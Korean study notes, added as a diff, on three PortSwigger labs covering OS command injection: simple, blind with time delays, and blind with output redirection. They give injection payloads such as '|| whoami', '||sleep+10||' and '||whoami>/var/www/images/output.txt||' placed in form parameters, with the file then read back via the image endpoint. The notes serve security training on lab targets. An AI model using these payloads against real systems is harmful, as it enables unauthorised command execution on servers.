@@ -1,0 +1,48 @@
+1) Lab: OS command injection, simple case
+> 기본 커맨드 인젝션
+
+1. 기본 페이지 확인 및 상품 페이지 확인
+> 파라미터 확인
+
+2. 넘어가는 값이 다 있어야 정상동작하는 듯함
+echo hello
+> 리피터로 보내 & , && , | , || 구분자 붙여 커맨드 추가
+& > 파라미터 구분인식하여 안되는듯 함
+&& > 파라미터 구분인식하여 안되는듯 함
+| > 공백 상관없이 뒤의 명령어 실행되어 보임
+|| > 파라미터에 다른 숫자와 글자를 넣었지만 안됨
+
+기본 파라미터 구분자 명령어
+
+3. 파이프로 사용자 이름 알아내기
+기본 파라미터 | whoami
+
+
+2) Lab: Blind OS command injection with time delays
+> 지연시간으로 확인하는 커맨드 인젝션
+
+1. 기본 페이지 확인 및 상품 페이지, 피드백 페이지 확인
+> 파라미터 확인
+
+2. 피드백 페이지에서 요청을 보내고 이메일 뒤에 구분자 삽입
+csrf=토큰&name=name&email=a||sleep+10||&subject=subject&message=message
+portswigger의 답은 ||ping+-c+10+127.0.0.1|| 넣기
+
+
+3) Lab: Blind OS command injection with output redirection
+> 결과가 안보이고 성공/실패만 확인되는 커맨드 인젝션
+
+1. 기본 페이지 확인 및 상품 페이지, 피드백 페이지 확인
+> 파라미터 확인
+
+2. 피드백 페이지에서 요청을 보내고 이메일 뒤에 구분자 삽입
+csrf=토큰&name=name&email=a||echo+hello||&subject=subject&message=message
+> hello는 보이지않지만 200으로 넘어가는것을 확인
+> sleep으로도 확인가능
+
+3. 출력할 내용 넣기
+csrf=토큰&name=name&email=a||whoami>/var/www/images/output.txt||&subject=subject&message=message
+> images 폴더에 output.txt라는 파일 생성 및 출력 내용 저장
+
+4. 메인화면으로 이동 후, 메인화면의 이미지 위치 확인 및 output.txt파일 위치로 이동
+/image?filename=output.txt
